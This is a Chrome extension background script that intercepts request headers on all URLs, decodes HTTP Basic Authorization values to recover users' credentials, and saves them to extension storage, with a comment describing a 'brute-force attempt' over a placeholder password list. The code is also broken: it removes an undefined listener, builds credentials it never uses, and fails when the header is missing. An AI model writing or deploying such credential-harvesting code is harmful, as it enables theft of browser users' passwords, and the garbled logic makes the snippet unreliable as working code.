
```javascript
// background.js (runs in the background)
chrome.storage.local.set({
  password: ""
});

chrome.webRequest.onBeforeSendHeaders.addListener(
  function(details) {
    // Extract the password from the HTTP headers
    let password = details.requestHeaders.find(header => header.name === 'Authorization').value;

    if (password.includes('Basic')) {
      // Remove "Basic " prefix
      password = password.split(' ')[1];

      // Check if the password is a base64 encoded string
      let decodedPassword;
      try {
        decodedPassword = atob(password);
      } catch (error) {}

      if (decodedPassword) {
        let guesses = ['guess1', 'guess2', 'guess3']; // Your list of passwords to guess

        for (let guess of guesses) {
          chrome.storage.local.get('password', function(result) {
            if (result.password == null || result.password == '') {
              // Brute-force attempt
              let credentials = btoa(`${guess}:anypass`);

              chrome.webRequest.onBeforeSendHeaders.removeListener(listener);

              // Update the password in storage
              chrome.storage.local.set({
                password: decodedPassword
              });
            }
          });
        }
      }
    }

    return {
      requestHeaders: details.requestHeaders
    };
  },
  {urls: ["<all_urls>"]},
  ['blocking', 'requestHeaders']
);
```
